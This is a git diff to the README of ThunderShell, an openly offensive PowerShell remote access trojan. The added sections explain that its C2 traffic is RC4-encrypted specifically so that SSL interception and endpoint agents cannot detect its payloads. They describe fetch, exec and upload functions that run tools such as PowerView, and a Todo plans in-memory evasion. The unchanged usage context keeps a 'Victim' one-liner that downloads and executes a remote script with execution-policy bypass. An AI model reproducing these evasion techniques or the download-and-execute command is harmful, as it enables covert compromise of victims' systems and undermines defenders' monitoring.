@@ -9,6 +9,23 @@ apt install redis-server
 apt install python-redis
 ```
 
+# How it works
+
+Once the PowerShell script is executed and HTTP request will be issued to the server. The body of each POST request contains the RC4 encrypted communication. Why RC4 because it's strong enough to hide the traffic. The idea is to upload / download data over the network that cannot be inspected. The RAT support HTTPS but some security product may perform SSL interception and obtain visibility on your data leading to detection of malicious payload (PowerShell script, stager etc...). The RC4 encryption allow you to communicate over the wire without leaking your payload. The RC4 encryption also protect against endpoint agent that inspect traffic directly on the host, again the traffic is decrypted at the "software" level blocking detection at that level too.
+
+To use the power of the tool there is some built in function such as `fetch`, `exec` and `upload` that allow you to run your payload quite easily.
+
+* Fetch flow
+
+```
+The server will fetch a resource (path, url) 
+        Send the data over the RC4 encrypted channel
+                The PowerShell RAT will decrypt the payload 
+                        PowerShell Execute the final payload
+```
+
+For example if you fetch PowerView.ps1 script it will be fully encrypted over the wire avoiding detection since the server is proxying the request and fully encrypt the data.
+
 # Usage
 
 Victim:
@@ -17,6 +34,11 @@ powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString("http://ri
 ```
 
 Attacker side example:
+
+```
+
+```
+
 ```
 me@debian-dev:~$ python ThunderShell.py default.json
 
@@ -114,6 +136,10 @@ UserFlags    : 66049
 Disabled     : False
 LastLogin    : 8/11/2017 5:58:47 PM
 ```
+
+# Todo
+
+Implement in memory protection to avoid endpoint in memory detection
 
 # Credit 
 Mr.Un1k0d3r RingZer0 Team 2017
